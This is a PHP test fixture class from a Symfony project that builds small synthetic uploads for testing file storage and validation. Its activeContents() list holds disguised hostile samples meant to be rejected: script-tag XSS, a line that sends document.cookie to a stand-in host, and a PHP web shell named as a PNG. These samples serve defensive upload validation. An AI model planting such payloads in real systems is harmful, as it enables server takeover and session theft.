<?php

declare(strict_types=1);

namespace App\Tests\Fixtures;

use Symfony\Component\Filesystem\Filesystem;
use Symfony\Component\HttpFoundation\File\UploadedFile;

/**
 * Petits fichiers synthétiques pour tester les stockages, sans dépendre de vrais documents.
 */
final class UploadFixtures
{
    public const PDF = "%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n%%EOF\n";

    private const PNG_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
    private const JPEG_BASE64 = '/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=';
    private const WEBP_BASE64 = 'UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==';

    private readonly string $directory;

    public function __construct()
    {
        $this->directory = sys_get_temp_dir().'/sae501-upload-fixtures-'.bin2hex(random_bytes(6));
        (new Filesystem())->mkdir($this->directory);
    }

    public function directory(): string
    {
        return $this->directory;
    }

    public function remove(): void
    {
        (new Filesystem())->remove($this->directory);
    }

    public function pdf(string $clientName = 'justificatif.pdf'): UploadedFile
    {
        return $this->file(self::PDF, $clientName);
    }

    public function png(string $clientName = 'image.png'): UploadedFile
    {
        return $this->file((string) base64_decode(self::PNG_BASE64, true), $clientName);
    }

    public function jpeg(string $clientName = 'photo.jpg'): UploadedFile
    {
        return $this->file((string) base64_decode(self::JPEG_BASE64, true), $clientName);
    }

    public function webp(string $clientName = 'image.webp'): UploadedFile
    {
        return $this->file((string) base64_decode(self::WEBP_BASE64, true), $clientName);
    }

    /**
     * En-tête JPEG valide (reconnu comme image/jpeg) suivi de données illisibles.
     */
    public function corruptedJpeg(string $clientName = 'photo.jpg'): UploadedFile
    {
        return $this->file("\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00".str_repeat("\x00", 64), $clientName);
    }

    /**
     * @param string|null $clientMimeType type annoncé par le navigateur, qui peut mentir
     */
    public function file(string $content, string $clientName, ?string $clientMimeType = null): UploadedFile
    {
        $path = $this->directory.'/'.bin2hex(random_bytes(8));
        file_put_contents($path, $content);

        return new UploadedFile($path, $clientName, $clientMimeType, null, true);
    }

    public function sized(int $bytes, string $clientName): UploadedFile
    {
        $path = $this->directory.'/'.bin2hex(random_bytes(8));
        $handle = fopen($path, 'w');
        \assert(false !== $handle);
        fwrite($handle, self::PDF);
        ftruncate($handle, $bytes);
        fclose($handle);

        return new UploadedFile($path, $clientName, null, null, true);
    }

    /**
     * Contenus actifs déguisés : ils ne doivent jamais être acceptés, quel que soit leur nom.
     *
     * @return iterable<string, array{string, string}>
     */
    public static function activeContents(): iterable
    {
        yield 'HTML nommé .pdf' => ['<!doctype html><html><body><script>alert(1)</script></body></html>', 'piece.pdf'];
        yield 'JavaScript nommé .pdf' => ["fetch('https://example.test/'+document.cookie);\n", 'piece.pdf'];
        yield 'PHP nommé .png' => ["<?php system(\$_GET['c']); ?>\n", 'image.png'];
        yield 'PHP nommé .php' => ["<?php echo 'x'; ?>\n", 'shell.php'];
        yield 'SVG avec script nommé .png' => ['<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'image.png'];
        yield 'SVG nommé .svg' => ['<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>', 'logo.svg'];
        yield 'archive ZIP nommée .pdf' => ["PK\x03\x04\x14\x00\x00\x00\x08\x00".str_repeat("\x00", 20), 'piece.pdf'];
        yield 'texte nommé .jpg' => ["simple texte\n", 'photo.jpg'];
    }
}
